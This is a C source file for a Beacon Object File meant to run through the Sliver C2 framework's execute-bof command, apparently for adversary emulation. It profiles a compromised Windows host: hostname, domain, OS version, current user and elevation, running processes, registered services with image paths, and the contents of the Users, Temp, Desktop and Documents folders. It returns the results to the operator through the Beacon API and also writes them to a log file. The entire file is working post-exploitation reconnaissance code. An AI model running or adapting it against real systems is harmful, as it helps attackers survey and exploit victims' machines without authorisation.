/*
 * wnet-bof.c — BOF version of WNetHelper-default for Sliver execute-bof (T1620 V3)
 * Collects local system info, outputs via Beacon API + writes to %LOCALAPPDATA%\wnet-bof.log
 *
 * Build (mingw):  x86_64-w64-mingw32-gcc -c wnet-bof.c -o wnet-bof.o
 * Build (MSVC):   cl /c /GS- /Os wnet-bof.c /Fo:wnet-bof.o
 * Run:            execute-bof wnet-bof.o
 */

#include <windows.h>
#include <tlhelp32.h>
#include "beacon.h"

/* ---- Dynamic Function Resolution ---- */

DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$GetComputerNameA(LPSTR, LPDWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$GetComputerNameExA(int, LPSTR, LPDWORD);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetEnvironmentVariableA(LPCSTR, LPSTR, DWORD);
DECLSPEC_IMPORT void    WINAPI KERNEL32$GetSystemInfo(LPSYSTEM_INFO);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Process32First(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Process32Next(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPVOID, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPVOID);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$FindFirstFileA(LPCSTR, LPWIN32_FIND_DATAA);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$FindNextFileA(HANDLE, LPWIN32_FIND_DATAA);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$FindClose(HANDLE);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetCurrentProcessId(void);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$IsWow64Process(HANDLE, PBOOL);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT LONG    NTAPI  NTDLL$RtlGetVersion(PRTL_OSVERSIONINFOW);

DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$GetUserNameA(LPSTR, LPDWORD);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$GetTokenInformation(HANDLE, int, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT LONG    WINAPI ADVAPI32$RegOpenKeyExA(HKEY, LPCSTR, DWORD, DWORD, PHKEY);
DECLSPEC_IMPORT LONG    WINAPI ADVAPI32$RegEnumKeyExA(HKEY, DWORD, LPSTR, LPDWORD, LPDWORD, LPSTR, LPDWORD, PFILETIME);
DECLSPEC_IMPORT LONG    WINAPI ADVAPI32$RegQueryValueExA(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT LONG    WINAPI ADVAPI32$RegCloseKey(HKEY);

DECLSPEC_IMPORT int     WINAPI SHLWAPI$wnsprintfA(LPSTR, int, LPCSTR, ...);

/* ---- Helpers ---- */

static char g_log[32768];
static int  g_pos = 0;

static void logprintf(const char *fmt, ...) {
    /* no varargs forwarding in BOF — use fixed-size sections instead */
}

static void logstr(const char *s) {
    int i = 0;
    while (s[i] && g_pos < sizeof(g_log) - 1) {
        g_log[g_pos++] = s[i++];
    }
}

static void logline(const char *label, const char *value) {
    logstr("  ");
    logstr(label);
    logstr(value);
    logstr("\r\n");
}

static void logint(const char *label, int val) {
    char buf[16];
    SHLWAPI$wnsprintfA(buf, sizeof(buf), "%d", val);
    logline(label, buf);
}

static void logsection(const char *name) {
    logstr("[");
    logstr(name);
    logstr("]\r\n");
}

/* ---- Sections ---- */

static void section_profile(void) {
    char buf[256];
    DWORD sz;

    logsection("PROFILE");

    sz = sizeof(buf);
    if (KERNEL32$GetComputerNameA(buf, &sz))
        logline("Hostname     : ", buf);

    sz = sizeof(buf);
    if (KERNEL32$GetComputerNameExA(2 /* ComputerNameDnsDomain */, buf, &sz) && sz > 0)
        logline("Domain       : ", buf);

    RTL_OSVERSIONINFOW vi;
    vi.dwOSVersionInfoSize = sizeof(vi);
    if (NTDLL$RtlGetVersion(&vi) == 0) {
        char ver[64];
        SHLWAPI$wnsprintfA(ver, sizeof(ver), "%d.%d build %d",
            vi.dwMajorVersion, vi.dwMinorVersion, vi.dwBuildNumber);
        logline("OS Version   : ", ver);
    }

    SYSTEM_INFO si;
    KERNEL32$GetSystemInfo(&si);
    logint("Processors   : ", si.dwNumberOfProcessors);

    BOOL wow64 = FALSE;
    KERNEL32$IsWow64Process(KERNEL32$GetCurrentProcess(), &wow64);
    logline("64-bit OS    : ", wow64 ? "True (WoW64)" : "True");

    logstr("\r\n");
}

static void section_session(void) {
    char buf[256];
    DWORD sz;

    logsection("SESSION");

    sz = sizeof(buf);
    if (ADVAPI32$GetUserNameA(buf, &sz))
        logline("User         : ", buf);

    HANDLE hToken = NULL;
    if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), 0x0008 /* TOKEN_QUERY */, &hToken)) {
        TOKEN_ELEVATION elev;
        DWORD ret;
        if (ADVAPI32$GetTokenInformation(hToken, 20 /* TokenElevation */, &elev, sizeof(elev), &ret))
            logline("Elevated     : ", elev.TokenIsElevated ? "True" : "False");
        KERNEL32$CloseHandle(hToken);
    }

    logstr("\r\n");
}

static void section_processes(void) {
    logsection("TASKS");
    logstr("  PID      Name\r\n");
    logstr("  ---      ----\r\n");

    HANDLE snap = KERNEL32$CreateToolhelp32Snapshot(0x00000002 /* TH32CS_SNAPPROCESS */, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        logstr("  Error: CreateToolhelp32Snapshot failed\r\n");
        return;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (KERNEL32$Process32First(snap, &pe)) {
        do {
            char line[300];
            SHLWAPI$wnsprintfA(line, sizeof(line), "  %-8d %s\r\n",
                pe.th32ProcessID, pe.szExeFile);
            logstr(line);
        } while (KERNEL32$Process32Next(snap, &pe));
    }
    KERNEL32$CloseHandle(snap);
    logstr("\r\n");
}

static void section_services(void) {
    HKEY hServices;
    logsection("SERVICES");

    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SYSTEM\\CurrentControlSet\\Services", 0,
            0x20019 /* KEY_READ */, &hServices) != 0) {
        logstr("  Unable to open registry key\r\n\r\n");
        return;
    }

    logstr("  Name                                     Start ImagePath\r\n");
    logstr("  ---                                      ----- ---------\r\n");

    char name[256];
    DWORD idx = 0, nameSz;
    while (1) {
        nameSz = sizeof(name);
        if (ADVAPI32$RegEnumKeyExA(hServices, idx++, name, &nameSz, NULL, NULL, NULL, NULL) != 0)
            break;

        HKEY hSvc;
        if (ADVAPI32$RegOpenKeyExA(hServices, name, 0, 0x20019, &hSvc) != 0)
            continue;

        DWORD type = 0, typeSz = sizeof(type);
        ADVAPI32$RegQueryValueExA(hSvc, "Type", NULL, NULL, (LPBYTE)&type, &typeSz);
        if ((type & 0x30) == 0) {
            ADVAPI32$RegCloseKey(hSvc);
            continue;
        }

        DWORD start = 0, startSz = sizeof(start);
        ADVAPI32$RegQueryValueExA(hSvc, "Start", NULL, NULL, (LPBYTE)&start, &startSz);

        char imgPath[128] = "";
        DWORD imgSz = sizeof(imgPath) - 1;
        ADVAPI32$RegQueryValueExA(hSvc, "ImagePath", NULL, NULL, (LPBYTE)imgPath, &imgSz);

        char line[300];
        if (imgPath[0])
            SHLWAPI$wnsprintfA(line, sizeof(line), "  %-42s %-5d %s\r\n", name, start, imgPath);
        else
            SHLWAPI$wnsprintfA(line, sizeof(line), "  %-42s %-5d\r\n", name, start);
        logstr(line);

        ADVAPI32$RegCloseKey(hSvc);
    }

    ADVAPI32$RegCloseKey(hServices);
    logstr("\r\n");
}

static void list_dir(const char *path) {
    logstr("  ");
    logstr(path);
    logstr(":\r\n");

    char pattern[MAX_PATH];
    SHLWAPI$wnsprintfA(pattern, sizeof(pattern), "%s\\*", path);

    WIN32_FIND_DATAA fd;
    HANDLE h = KERNEL32$FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) {
        logstr("    (access denied)\r\n");
        return;
    }
    do {
        if (fd.cFileName[0] == '.' &&
            (fd.cFileName[1] == 0 || (fd.cFileName[1] == '.' && fd.cFileName[2] == 0)))
            continue;
        logstr("    ");
        logstr(fd.cFileName);
        logstr("\r\n");
    } while (KERNEL32$FindNextFileA(h, &fd));
    KERNEL32$FindClose(h);
}

static void section_files(void) {
    logsection("FILES");

    list_dir("C:\\Users");
    list_dir("C:\\Windows\\Temp");

    char buf[MAX_PATH];
    DWORD sz = KERNEL32$GetEnvironmentVariableA("USERPROFILE", buf, sizeof(buf));
    if (sz > 0 && sz < sizeof(buf)) {
        char desktop[MAX_PATH], docs[MAX_PATH];
        SHLWAPI$wnsprintfA(desktop, sizeof(desktop), "%s\\Desktop", buf);
        SHLWAPI$wnsprintfA(docs, sizeof(docs), "%s\\Documents", buf);
        list_dir(desktop);
        list_dir(docs);
    }

    logstr("\r\n");
}

/* ---- Write log file ---- */

static void write_logfile(void) {
    char path[MAX_PATH];
    DWORD sz = KERNEL32$GetEnvironmentVariableA("LOCALAPPDATA", path, sizeof(path) - 20);
    if (sz == 0) return;

    SHLWAPI$wnsprintfA(path + sz, sizeof(path) - sz, "\\wnet-bof.log");

    HANDLE hFile = KERNEL32$CreateFileA(path,
        0x40000000 /* GENERIC_WRITE */, 0, NULL,
        2 /* CREATE_ALWAYS */, 0x80 /* FILE_ATTRIBUTE_NORMAL */, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    DWORD written;
    KERNEL32$WriteFile(hFile, g_log, g_pos, &written, NULL);
    KERNEL32$CloseHandle(hFile);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Output written to %s\n", path);
}

/* ---- Entry ---- */

void go(char *args, int len) {
    g_pos = 0;

    section_profile();
    section_session();
    section_processes();
    section_services();
    section_files();

    BeaconOutput(CALLBACK_OUTPUT, g_log, g_pos);
    write_logfile();
}
